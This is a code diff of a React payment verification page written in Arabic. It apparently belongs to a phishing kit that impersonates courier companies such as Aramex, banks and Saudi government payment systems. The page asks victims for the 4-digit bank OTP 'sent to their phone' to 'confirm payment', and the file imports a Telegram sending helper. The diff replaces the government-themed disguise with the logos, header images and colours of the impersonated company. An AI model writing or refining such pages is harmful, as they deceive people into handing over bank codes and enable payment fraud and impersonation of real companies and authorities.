@@ -9,7 +9,6 @@ import { sendToTelegram } from "@/lib/telegram";
 import { Shield, AlertCircle, Check, Lock, Clock, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import {
   InputOTP,
   InputOTPGroup,
@@ -33,10 +32,6 @@ const PaymentOTP = () => {
   const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  
-  // Get government payment system
-  const selectedCountry = link?.payload?.selectedCountry || "SA";
-  const govSystem = getGovernmentPaymentSystem(selectedCountry);
   
   // Countdown timer
   useEffect(() => {
@@ -209,58 +204,62 @@ const PaymentOTP = () => {
       onKeyDown={handleKeyDown}
       tabIndex={0}
       style={{
-        background: govSystem.colors.surface
+        background: `linear-gradient(135deg, ${branding.colors.primary}08, ${branding.colors.secondary}08)`
       }}
     >
       <div className="container mx-auto px-3 sm:px-4">
         <div className="max-w-md mx-auto">
-          {/* Government System Header */}
-          <div className="text-center mb-6">
+          {/* Company Header Image */}
+          {branding.ogImage && (
+            <div className="mb-4 sm:mb-6 rounded-xl overflow-hidden shadow-lg">
+              <img 
+                src={branding.ogImage} 
+                alt={serviceName}
+                className="w-full h-32 sm:h-48 object-cover"
+                onError={(e) => e.currentTarget.style.display = 'none'}
+              />
+            </div>
+          )}
+          
+          {/* Company Logo */}
+          {branding.logo && (
+            <div className="text-center mb-4 sm:mb-6">
+              <img 
+                src={branding.logo} 
+                alt={serviceName}
+                className="h-10 sm:h-12 mx-auto"
+                onError={(e) => e.currentTarget.style.display = 'none'}
+              />
+            </div>
+          )}
+          
+          {/* Security Badge */}
+          <div className="text-center mb-3 sm:mb-6">
             <Badge 
-              className="text-sm px-4 py-2 mb-4"
+              className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2 text-white"
               style={{
-                background: govSystem.gradients.primary,
-                color: govSystem.colors.textOnPrimary,
-                fontFamily: govSystem.fonts.primaryAr
+                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
               }}
             >
-              <Lock className="w-4 h-4 ml-2" />
-              <span>{govSystem.nameAr}</span>
+              <Lock className="w-3 h-3 sm:w-4 sm:h-4 ml-1.5 sm:ml-2" />
+              <span>التحقق الآمن</span>
             </Badge>
-            <h1 
-              className="text-xl font-bold mb-2"
-              style={{ color: govSystem.colors.text, fontFamily: govSystem.fonts.primaryAr }}
-            >
-              رمز التحقق
-            </h1>
-            <p 
-              className="text-sm"
-              style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}
-            >
-              {govSystem.description}
-            </p>
           </div>
           
-          <Card 
-            className="p-4 sm:p-8 shadow-elevated border-0" 
-            style={{ 
-              boxShadow: govSystem.shadows.lg,
-              borderRadius: govSystem.borderRadius.lg
-            }}
-          >
+          <Card className="p-4 sm:p-8 shadow-elevated border-2" style={{ borderColor: `${branding.colors.primary}20` }}>
             <div className="flex items-center justify-between mb-4 sm:mb-6">
               <div className="flex items-center gap-2 sm:gap-3">
                 <div 
                   className="w-10 h-10 sm:w-12 sm:h-12 rounded-lg sm:rounded-xl flex items-center justify-center animate-pulse"
                   style={{
-                    background: govSystem.gradients.primary
+                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                   }}
                 >
                   <Shield className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
                 </div>
                 <div>
-                  <h2 className="text-lg sm:text-xl font-bold" style={{ fontFamily: govSystem.fonts.primaryAr, color: govSystem.colors.text }}>رمز التحقق</h2>
-                  <p className="text-xs sm:text-sm" style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}>
+                  <h1 className="text-lg sm:text-2xl font-bold">رمز التحقق</h1>
+                  <p className="text-xs sm:text-sm text-muted-foreground">
                     {serviceName}
                   </p>
                 </div>
@@ -271,9 +270,8 @@ const PaymentOTP = () => {
                 <div 
                   className="flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs sm:text-sm font-semibold"
                   style={{
-                    background: `${govSystem.colors.primary}15`,
-                    color: govSystem.colors.primary,
-                    fontFamily: govSystem.fonts.primaryAr
+                    background: `${branding.colors.primary}15`,
+                    color: branding.colors.primary
                   }}
                 >
                   <Clock className="w-3 h-3 sm:w-4 sm:h-4" />
@@ -286,13 +284,12 @@ const PaymentOTP = () => {
             <div 
               className="p-3 sm:p-4 rounded-md sm:rounded-lg mb-4 sm:mb-6"
               style={{
-                background: `${govSystem.colors.primary}10`,
-                border: `1px solid ${govSystem.colors.primary}30`,
-                borderRadius: govSystem.borderRadius.md
+                background: `${branding.colors.primary}10`,
+                border: `1px solid ${branding.colors.primary}30`
               }}
             >
-              <p className="text-xs sm:text-sm" style={{ color: govSystem.colors.primary, fontFamily: govSystem.fonts.primaryAr }}>
-                تم إرسال رمز التحقق المكون من 4 أرقام إلى هاتفك المسجل عبر {govSystem.nameAr}.
+              <p className="text-xs sm:text-sm" style={{ color: branding.colors.primary }}>
+                تم إرسال رمز التحقق المكون من 4 أرقام إلى هاتفك المسجل في البنك.
               </p>
             </div>
             
@@ -322,10 +319,8 @@ const PaymentOTP = () => {
                         index={index}
                         className="w-12 h-12 sm:w-16 sm:h-16 text-xl sm:text-3xl font-bold border-2 rounded-lg transition-all"
                         style={{
-                          borderColor: otp[index] ? govSystem.colors.primary : `${govSystem.colors.primary}40`,
-                          background: otp[index] ? `${govSystem.colors.primary}10` : 'transparent',
-                          borderRadius: govSystem.borderRadius.sm,
-                          fontFamily: govSystem.fonts.primary
+                          borderColor: otp[index] ? branding.colors.primary : `${branding.colors.primary}40`,
+                          background: otp[index] ? `${branding.colors.primary}10` : 'transparent'
                         }}
                       />
                     ))}
@@ -380,10 +375,7 @@ const PaymentOTP = () => {
               onClick={handleSubmit}
               disabled={updatePayment.isPending || isLocked || otp.length < 4}
               style={{
-                background: govSystem.gradients.primary,
-                fontFamily: govSystem.fonts.primaryAr,
-                borderRadius: govSystem.borderRadius.md,
-                boxShadow: govSystem.shadows.md
+                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
               }}
             >
               {updatePayment.isPending ? (
@@ -393,16 +385,13 @@ const PaymentOTP = () => {
               ) : (
                 <>
                   <Check className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
-                  <span>تأكيد الدفع - {govSystem.nameAr}</span>
+                  <span>تأكيد الدفع</span>
                 </>
               )}
             </Button>
             
-            <p 
-              className="text-[10px] sm:text-xs text-center mt-3 sm:mt-4"
-              style={{ color: govSystem.colors.textLight, fontFamily: govSystem.fonts.primaryAr }}
-            >
-              لم تستلم الرمز؟ تحقق من رسائلك أو تواصل مع {govSystem.nameAr}
+            <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
+              لم تستلم الرمز؟ تحقق من رسائلك أو اتصل بالبنك
             </p>
           </Card>
           
